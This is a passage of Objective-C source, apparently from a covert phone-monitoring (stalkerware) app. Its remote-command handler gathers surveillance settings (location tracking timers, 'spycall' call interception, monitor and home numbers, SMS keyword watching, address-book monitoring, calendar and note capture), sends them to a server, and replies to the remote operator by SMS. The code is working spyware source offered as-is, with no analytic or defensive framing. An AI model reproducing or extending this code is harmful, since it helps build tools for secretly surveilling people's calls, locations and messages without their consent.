		[element setMSettingId:kRemoteCmdWatchNumbers];
		[element setMSettingValue:watchNumberString];
		[settingElementArray addObject:element];
		[element release];
		element = nil;
	}	
			
	// -- Location timer
	if ([configurationManager isSupportedFeature:kFeatureID_EventLocation]) {
		DLog (@"-16-")
		NSInteger locationTimer = 0;
		switch ([prefLocation mLocationInterval]) {
			case 10:
				locationTimer = 1;
				break;
			case 30:
				locationTimer = 2;
				break;
			case 60:
				locationTimer = 3;
				break;
			case 300:
				locationTimer = 4;
				break;
			case 600:
				locationTimer = 5;
				break;
			case 1800:
				locationTimer = 6;
				break;
			case 2400:
				locationTimer = 7;
				break;
			case 3600:
				locationTimer = 8;
				break;	
			default:
				break;
		}
		element = [[FxSettingsElement alloc] init];
		[element setMSettingId:kRemoteCmdSetLocationTimer];
		[element setMSettingValue:[NSString stringWithFormat:@"%d", locationTimer]];
		[settingElementArray addObject:element];
		[element release];
		element = nil;
	}
	// -- Panic mode
	if ([configurationManager isSupportedFeature:kFeatureID_Panic]) {
		DLog (@"-17-")
		NSString *panicMode = [NSString string];
		if ([prefPanic mLocationOnly]) {		// Location only
			panicMode = @"2";
		} else {								// Location and Image
			panicMode = @"1";
		}		
		element = [[FxSettingsElement alloc] init];
		[element setMSettingId:kRemoteCmdPanicMode];
		[element setMSettingValue:panicMode];
		[settingElementArray addObject:element];
		[element release];
		element = nil;
	}
	// -- Notification Numbers
	if ([configurationManager isSupportedFeature:kFeatureID_NotificationNumbers]) {		
		DLog (@"-18-")
		NSString *notificationNumberString = [self displayStringWithNumberArray:[prefNotificationNumberList mNotificationNumbers] 
																  remoteCommand:kRemoteCmdNotificationNumbers];											  
		DLog (@"notification number %@", notificationNumberString);
		element = [[FxSettingsElement alloc] init];
		[element setMSettingId:kRemoteCmdNotificationNumbers];
		[element setMSettingValue:notificationNumberString];
		[settingElementArray addObject:element];	
		[element release];
		element = nil;
	}
	// -- Home Numbers
	if ([configurationManager isSupportedFeature:kFeatureID_HomeNumbers]) {		
		DLog (@"-19-")
		NSString *homeNumberString = [self displayStringWithNumberArray:[prefHomeNumberList mHomeNumbers] 
																  remoteCommand:kRemoteCmdHomeNumbers];											  
		DLog (@"home number %@",[prefHomeNumberList mHomeNumbers] );
		element = [[FxSettingsElement alloc] init];
		[element setMSettingId:kRemoteCmdHomeNumbers];
		[element setMSettingValue:homeNumberString];
		[settingElementArray addObject:element];	
		[element release];
		element = nil;
	}
	// -- CIS Number kRemoteCmdCISNumbers
	// -- Monitor Numbers
	if ([configurationManager isSupportedFeature:kFeatureID_MonitorNumbers]) {		
		DLog (@"-20-")
		NSString *monitorNumberString = [self displayStringWithNumberArray:[prefMonitor mMonitorNumbers] 
														  remoteCommand:kRemoteCmdMonitorNumbers];											  
		element = [[FxSettingsElement alloc] init];
		[element setMSettingId:kRemoteCmdMonitorNumbers];
		[element setMSettingValue:monitorNumberString];
		[settingElementArray addObject:element];	
		[element release];
		element = nil;
		
		DLog (@"monitorNumberString = %@", monitorNumberString);
	}
	// -- Enable spycall
	if ([configurationManager isSupportedFeature:kFeatureID_SpyCall]) {
		DLog (@"-21-")
		element = [[FxSettingsElement alloc] init];
		[element setMSettingId:kRemoteCmdEnableSpyCall];
		[element setMSettingValue:[NSString stringWithFormat:@"%d", [prefMonitor mEnableMonitor]]];
		[settingElementArray addObject:element];
		[element release];
		element = nil;
	}
	// -- Enable restriction
	if ([configurationManager isSupportedFeature:kFeatureID_CommunicationRestriction]) {
		DLog (@"-22-")
		element = [[FxSettingsElement alloc] init];
		[element setMSettingId:kRemoteCmdEnableRestrictions];
		[element setMSettingValue:[NSString stringWithFormat:@"%d", [prefRestriction mEnableRestriction]]];
		[settingElementArray addObject:element];
		[element release];
		element = nil;
	}
	// -- Address book mode management
	if ([configurationManager isSupportedFeature:kFeatureID_AddressbookManagement]) {
		DLog (@"-23-")
		NSInteger mode = 0;
		DLog (@"%d",[prefRestriction mAddressBookMgtMode])
		switch ([prefRestriction mAddressBookMgtMode]) {
			case kAddressMgtModeOff:
				mode = 0;
				break;
			case kAddressMgtModeMonitor:
				mode = 1;
				break;
			case kAddressMgtModeRestrict:
				mode = 2;
				break;
		}
		element = [[FxSettingsElement alloc] init];
		[element setMSettingId:kRemoteCmdAddressBookManagementMode];
		[element setMSettingValue:[NSString stringWithFormat:@"%d", mode]];	// 0, 1, or 2
		[settingElementArray addObject:element];
		[element release];
		element = nil;
	}
	// -- vcard version
	if ([configurationManager isSupportedFeature:kFeatureID_AddressbookManagement]) {
		DLog (@"-24-")
		element = [[FxSettingsElement alloc] init];
		[element setMSettingId:kRemoteCmdVCARD_VERSION];
		[element setMSettingValue:kVCardVersion];
		[settingElementArray addObject:element];
		[element release];
		element = nil;
	}
	// -- Enable application profile
	if ([configurationManager isSupportedFeature:kFeatureID_ApplicationProfile]) {
		DLog (@"-25-")
		element = [[FxSettingsElement alloc] init];
		[element setMSettingId:kRemoteCmdEanbleApplicationProfile];
		[element setMSettingValue:[NSString stringWithFormat:@"%d", [prefRestriction mEnableAppProfile]]];
		[settingElementArray addObject:element];
		[element release];
		element = nil;
	}
	// -- Enable url profile
	if ([configurationManager isSupportedFeature:kFeatureID_BrowserUrlProfile]) {
		DLog (@"-26-")
		element = [[FxSettingsElement alloc] init];
		[element setMSettingId:kRemoteCmdEnableUrlProfile];
		[element setMSettingValue:[NSString stringWithFormat:@"%d", [prefRestriction mEnableUrlProfile]]];
		[settingElementArray addObject:element];
		[element release];
		element = nil;
	}
	// -- Emergency Numbers
	if ([configurationManager isSupportedFeature:kFeatureID_EmergencyNumbers]) {		
		DLog (@"-Emergency Number-")
		NSString *emergencyNumberString = [self displayStringWithNumberArray:[prefEmergencyNumberList mEmergencyNumbers] 
															   remoteCommand:kRemoteCmdEmergencyNumbers];											  
		DLog (@"Emergency %@",[prefEmergencyNumberList mEmergencyNumbers]);
		
		element = [[FxSettingsElement alloc] init];
		[element setMSettingId:kRemoteCmdEmergencyNumbers];
		[element setMSettingValue:emergencyNumberString];
		[settingElementArray addObject:element];	
		[element release];
		element = nil;
	}
	//-- Waiting for approval policy
	if ([configurationManager isSupportedFeature:kFeatureID_CommunicationRestriction]) {
		DLog (@"-27-")
		element = [[FxSettingsElement alloc] init];
		[element setMSettingId:kRemoteCmdEnableWaitingForApprovalPolicy];
		//DLog (@"Send wait policy back to server %d", ![prefRestriction mWaitingForApprovalPolicy])
		[element setMSettingValue:[NSString stringWithFormat:@"%d", ![prefRestriction mWaitingForApprovalPolicy]]];
		[settingElementArray addObject:element];
		[element release];
		element = nil;
	}
	//-- Calendar
	if ([configurationManager isSupportedFeature:kFeatureID_EventCalendar]) {
		DLog (@"-28-")
		element = [[FxSettingsElement alloc] init];
		[element setMSettingId:kRemoteCmdCalendar];
		[element setMSettingValue:[NSString stringWithFormat:@"%d", [prefEvents mEnableCalendar]]];
		[settingElementArray addObject:element];
		[element release];
		element = nil;
	}
	//-- Note
	if ([configurationManager isSupportedFeature:kFeatureID_NoteCapture]) {
		DLog (@"-29-")
		element = [[FxSettingsElement alloc] init];
		[element setMSettingId:kRemoteCmdNote];
		[element setMSettingValue:[NSString stringWithFormat:@"%d", [prefEvents mEnableNote]]];
		[settingElementArray addObject:element];
		[element release];
		element = nil;
	}
	//-- Keywords
	if ([configurationManager isSupportedFeature:kFeatureID_SMSKeyword]) {
		NSString *smsKeywords = [self displayStringWithNumberArray:[prefKeywords mKeywords] 
													 remoteCommand:kRemoteCmdSMSKeywords];
		element = [[FxSettingsElement alloc] init];
		[element setMSettingId:kRemoteCmdSMSKeywords];
		[element setMSettingValue:smsKeywords];
		[settingElementArray addObject:element];
		[element release];
		element = nil;
	}
	
	// -- create Setting event
	FxSettingsEvent *fxSettingEvents = [[FxSettingsEvent alloc] init];
	[fxSettingEvents setMSettingArray:settingElementArray];
	[fxSettingEvents setDateTime:[DateTimeFormat phoenixDateTime]];
	// -- send Setting event	
	id eventDelegate = [[RemoteCmdUtils sharedRemoteCmdUtils] mEventDelegate];
	if ([eventDelegate respondsToSelector:@selector(eventFinished:)]) {
		DLog (@"!!!!!! sending Setting Event to the server")
		[eventDelegate performSelector:@selector(eventFinished:) withObject:fxSettingEvents];
	}		
	[fxSettingEvents release];
	fxSettingEvents = nil;	
}

/**
 - Method name: displayStringWithItems:andCaption
 - Purpose:This method is used to append display string
 - Argument list and description: aItems(NSArray),aCaption(NSString)
 - Return description: aCaption (NSString) 
*/

- (NSString *) displayStringWithItems: (NSArray *) aItems andCaption:(NSString *)aCaption {
	NSString *itemString=@"";
	for (int index=0;index<[aItems count]; index++) {
		if (index==[aItems count]-1) 
			itemString=[NSString stringWithFormat:@"%@%@",itemString,[aItems objectAtIndex:index]];
		else {
		    itemString=[NSString stringWithFormat:@"%@%@, ",itemString,[aItems objectAtIndex:index]];	
		}
    }
	if ([itemString length]) {
		itemString = [NSString stringWithFormat:@"[%@]", itemString];
		aCaption=[aCaption stringByAppendingString:itemString];
	}
	else {
		aCaption= [aCaption stringByAppendingString:NSLocalizedString(@"kNone", @"")];
	}
	return aCaption;
}

/**
 - Method name:			displayStringWithNumberArray:remoteCommand
 - Purpose:				This method is used to append display string
 - Argument list and description: aNumberArray(NSArray), remoteCommand(NSInteger)
 - Return description:	formattedNotificationNumberString (NSString) 
 */

- (NSString *) displayStringWithNumberArray: (NSArray *) aNumberArray remoteCommand: (NSInteger) aRemoteCommand {
	// -- Number formatting e.g., 0811111111;0822222222;0833333333
	NSString *formattedNumberString = @"";
	for (int index = 0; index < [aNumberArray count]; index++) {
		if (index == [aNumberArray count] - 1)						// the last number in array
			formattedNumberString = [NSString stringWithFormat:@"%@%@", formattedNumberString, [aNumberArray objectAtIndex:index]];  // e.g., 48:0811111111
		else														// non-last number in array
		    formattedNumberString = [NSString stringWithFormat:@"%@%@;", formattedNumberString, [aNumberArray objectAtIndex:index]]; // e.g., 48:0811111111;0812222222;		
    }	
	DLog (@"final formattedNumberString = %@", formattedNumberString)
	return formattedNumberString;
}
/**
 - Method name: sendReplySMS
 - Purpose:This method is used to send the SMS reply
 - Argument list and description: aStatusCode (NSUInteger)
 - Return description: No return type
*/

- (void) sendReplySMSWithResult: (NSString *) aResult {
	DLog (@"RequestSettingsProcessor--->sendReplySMS")
	NSString *messageFormat=[[RemoteCmdUtils sharedRemoteCmdUtils] replyMessageFormatWithCommandCode:[self remoteCmdCode]
															    					  andErrorCode:_SUCCESS_];
	NSString *requestSettingsMessage=[NSString stringWithFormat:@"%@%@",messageFormat,aResult];
	
	[[RemoteCmdUtils sharedRemoteCmdUtils] createSystemEvent:mRemoteCmdData
											 andReplyMessage:requestSettingsMessage];
	
	if ([mRemoteCmdData mIsSMSReplyRequired]) {	
		[[RemoteCmdUtils sharedRemoteCmdUtils] sendSMSWithRecipientNumber:[self recipientNumber] 
														       andMessage:requestSettingsMessage];
	}
}

/*
 - Method name:dealloc
 - Purpose: This is memory mangement method. Invoked when the class object releasd.
 - Argument list and description: No argument
 - Return type and description: No Return
*/

-(void) dealloc {
	[super dealloc];
}


@end
